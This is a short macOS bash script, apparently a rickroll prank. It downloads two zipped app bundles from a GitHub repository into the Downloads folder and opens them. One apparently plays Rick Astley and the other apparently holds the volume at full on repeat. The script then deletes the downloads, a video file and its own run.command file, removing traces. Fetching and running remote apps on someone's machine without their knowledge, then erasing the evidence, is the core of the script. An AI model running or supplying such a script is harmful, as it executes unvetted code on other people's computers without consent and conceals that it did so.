#!/bin/bash

cd ~/Downloads/
curl -o play_rick_astley.app.zip -L https://github.com/jabanayt/test1/raw/master/Play_Rick_Astley.app.zip
open play_rick_astley.app.zip
curl -o volume_repeat.zip -L https://github.com/jabanayt/test1/raw/master/Volume_full_repeat_non_shell.app.zip
unzip volume_repeat.zip
open Volume_full_repeat_non_shell.app
open Play_Rick_Astley.app
rm play_rick_astley.app.zip
rm -rf Play_Rick_Astley.app
rm -rf Volume_full_repeat_non_shell.app
rm volume_repeat.zip
rm Never%20Gonna%20Hit%20Those%20Notes.mp4
rm -rf __MACOSX/
rm run.command